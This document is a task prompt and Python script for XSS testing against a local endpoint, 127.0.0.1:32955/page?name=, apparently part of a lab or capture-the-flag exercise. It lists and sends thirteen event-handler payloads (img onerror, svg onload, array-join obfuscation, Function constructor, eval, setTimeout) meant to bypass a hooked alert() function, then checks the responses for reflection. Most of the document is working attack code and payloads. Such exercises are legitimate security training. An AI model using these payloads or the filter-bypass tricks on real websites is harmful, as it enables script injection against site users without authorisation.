Test event handler bypass for XSS on target 127.0.0.1:32955/page?name= endpoint.

The context indicates that alert() is hooked on the main window via Object.defineProperty, but event handlers execute in a different context where the hook doesn't apply.

Test the following specific payloads to verify event handler execution:

1. Test onerror handlers:
   - `<img src=x onerror="alert('XSS')">`
   - `<img src=x onerror='alert("XSS")'>`

2. Test onload handlers:
   - `<svg onload="alert('XSS')">`
   - `<body onload="alert('XSS')">`

3. Test more sophisticated payloads designed to bypass the hook:
   - `<img src=x onerror="top[['al','ert'].join('')]('XSS')">`
   - `<img src=x onerror="self.alert('XSS')">`
   - `<img src=x onerror="window.alert('XSS')">`

For each payload:
1. URL-encode as needed for GET parameter
2. Send request to /page?name=<payload>
3. Check if the response indicates successful execution

Report which payloads successfully bypass the alert hook and execute alert('XSS'). Document any successful bypass technique found.

import requests
import urllib.parse

# Target configuration
TARGET_HOST = "127.0.0.1:32955"
BASE_URL = f"http://{TARGET_HOST}"
ENDPOINT = "/page"

# Payloads to test - various event handler bypasses
payloads = [
    # Basic onerror handlers
    ('Basic onerror double quotes', '<img src=x onerror="alert(\'XSS\')">'),
    ('Basic onerror single quotes', "<img src=x onerror='alert(\"XSS\")'>"),
    
    # SVG and body onload handlers
    ('SVG onload', '<svg onload="alert(\'XSS\')">'),
    ('Body onload', '<body onload="alert(\'XSS\')">'),
    
    # Array join bypass
    ('Array join bypass', "<img src=x onerror=\"top[['al','ert'].join('')]('XSS')\">"),
    
    # self.alert bypass
    ('self.alert bypass', "<img src=x onerror=\"self.alert('XSS')\">"),
    
    # window.alert bypass
    ('window.alert bypass', "<img src=x onerror=\"window.alert('XSS')\">"),
    
    # Additional bypass techniques
    ('Parent alert', "<img src=x onerror=\"parent.alert('XSS')\">"),
    ('Top alert direct', "<img src=x onerror=\"top.alert('XSS')\">"),
    ('Constructor alert', "<img src=x onerror=\"alert.constructor('alert(\\'XSS\\')')()\">"),
    ('Function constructor', "<img src=x onerror=\"new Function('alert(\\'XSS\\')')()\">"),
    ('setTimeout alert', "<img src=x onerror=\"setTimeout('alert(\\'XSS\\')',0)\">"),
    ('eval alert', "<img src=x onerror=\"eval('alert(\\'XSS\\')')\">"),
]

print("=" * 70)
print("XSS Event Handler Bypass Testing")
print(f"Target: {BASE_URL}{ENDPOINT}?name=<payload>")
print("=" * 70)

results = []

for name, payload in payloads:
    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload)
    url = f"{BASE_URL}{ENDPOINT}?name={encoded_payload}"
    
    try:
        response = requests.get(url, timeout=10)
        
        # Analyze response for signs of successful execution or reflection
        response_text = response.text
        
        # Check for indicators in response
        indicators = {
            'reflected_payload': payload in response_text or urllib.parse.unquote(encoded_payload) in response_text,
            'alert_xss': 'alert' in response_text and 'XSS' in response_text,
            'onerror_present': 'onerror' in response_text,
            'onload_present': 'onload' in response_text,
            'img_tag': '<img' in response_text,
            'svg_tag': '<svg' in response_text,
        }
        
        # Determine status
        status = "POTENTIAL BYPASS" if indicators['reflected_payload'] else "FILTERED/NOT REFLECTED"
        
        print(f"\n[TEST] {name}")
        print(f"  Payload: {payload}")
        print(f"  URL: {url[:100]}...")
        print(f"  Status Code: {response.status_code}")
        print(f"  Response Length: {len(response_text)} bytes")
        print(f"  Indicators:")
        for ind, present in indicators.items():
            print(f"    - {ind}: {'YES' if present else 'NO'}")
        
        # Save detailed response for potential bypasses
        if indicators['reflected_payload']:
            print(f"\n  [+] RESPONSE FRAGMENT (first 1000 chars):")
            # Find where payload appears
            payload_pos = response_text.find(payload)
            if payload_pos == -1:
                # Try finding parts of it
                payload_pos = response_text.find('<img')
            if payload_pos == -1:
                payload_pos = response_text.find('<svg')
            if payload_pos == -1:
                payload_pos = response_text.find('onerror')
            if payload_pos == -1:
                payload_pos = response_text.find('onload')
            
            if payload_pos != -1:
                start = max(0, payload_pos - 100)
                end = min(len(response_text), payload_pos + 300)
                print(f"  {response_text[start:end]}")
            else:
                print(f"  {response_text[:1000]}")
        
        results.append({
            'name': name,
            'payload': payload,
            'encoded': encoded_payload,
            'status_code': response.status_code,
            'indicators': indicators,
            'url': url,
            'full_response': response_text
        })
        
    except Exception as e:
        print(f"\n[ERROR] {name}: {e}")
        results.append({
            'name': name,
            'payload': payload,
            'error': str(e)
        })

# Summary
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)

successful_bypasses = []
for r in results:
    if 'error' in r:
        print(f"[ERROR] {r['name']}: {r['error']}")
    elif r['indicators'].get('reflected_payload'):
        print(f"[POTENTIAL BYPASS] {r['name']}")
        successful_bypasses.append(r)
    else:
        print(f"[FILTERED] {r['name']}")

print(f"\nTotal payloads tested: {len(payloads)}")
print(f"Potential bypasses found: {len(successful_bypasses)}")

if successful_bypasses:
    print("\n" + "-" * 70)
    print("DETAILED BYPASS RESULTS:")
    print("-" * 70)
    for r in successful_bypasses:
        print(f"\n[+] {r['name']}")
        print(f"    Payload: {r['payload']}")
        print(f"    URL-encoded: {r['encoded'][:80]}...")
        print(f"    Status: {r['status_code']}")
        print(f"    Full URL: {r['url']}")
        
        # Write full response to analyze
        print(f"\n    Full Response (first 2000 chars):")
        print(r['full_response'][:2000])

print("\n[TESTING COMPLETE]")

